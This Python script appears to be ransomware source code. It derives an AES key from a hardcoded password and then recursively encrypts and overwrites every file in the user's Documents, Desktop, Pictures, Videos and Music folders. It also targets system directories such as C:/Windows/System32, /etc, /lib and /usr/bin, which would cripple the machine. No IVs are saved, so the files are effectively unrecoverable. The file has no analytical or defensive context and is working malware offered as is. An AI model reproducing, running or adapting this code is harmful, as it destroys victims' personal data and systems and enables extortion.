import os
import getpass
import platform
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
'''
Function To Get OS name
'''
def discover_os():
    os_name = platform.system()
    return os_name
'''
Function To Get Windows Username
'''
def username():
    username = os.environ['USERNAME']
    return username
'''
Function To Generate a Key For Encrypt
'''
def generate_key():
    salt = b'\xa0\xba8\x99\xe9\xa4\xb5\n\x1e\x93\x80\xc6\xff\x19\xbb\x02\x98t5\xbe\x13\x9e\xac@X\xd5\x90\xcc\x91\xe1\xdc|'
    password = 'gorgumu'
    KEY = PBKDF2(password,salt,dkLen=32)
    with open("Key.bin","wb") as k:
        k.write(KEY)
'''
Function To Encrypt Client Data Using AES Encryption Algorithm
'''

def Encrypt():
    usr = username()
    ost = discover_os()
    #-------------------------------|WINDOWS|---------------------------------------
    if ost == 'Windows':
        paths_files = [
            f"C:/Users/{usr}/Documents/",f"C:/Users/{usr}/Videos/",f'C:/Users/{usr}/Desktop/',
            f"C:/Users/{usr}/Pictures",f"C:/Users/{usr}/Music",f"C:/Windows/System32"
            ]
    #-------------------------------|LINUX|----------------------------------------------
    if ost == 'Linux':
        lnxusr = getpass.getuser()
        paths_files = [
            "/etc/","/lib/","/usr/bin/",f"/home/{lnxusr}/",f"/home/{lnxusr}/Desktop/"
        ]
    for path in paths_files:
        salt = b'\xa0\xba8\x99\xe9\xa4\xb5\n\x1e\x93\x80\xc6\xff\x19\xbb\x02\x98t5\xbe\x13\x9e\xac@X\xd5\x90\xcc\x91\xe1\xdc|'
        password = 'gorgumu'
        #--------------------|Generate Key|------------------------------------
        KEY = PBKDF2(password,salt,dkLen=32)
        #--------------------|Generate Cipher|---------------------------------
        cipher = AES.new(KEY,AES.MODE_CBC)
        #--------------------|Crawling Into Subfolders|------------------------
        for root, dirs, files in os.walk(path):
            for file in files:
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                    #--------------------|Start Encrypte|----------------------
                    cyphered_data = cipher.encrypt(pad(file_data,AES.block_size))
                    encrypted_file_path = file_path 
                with open(encrypted_file_path, 'wb') as f:
                    f.write(cyphered_data)
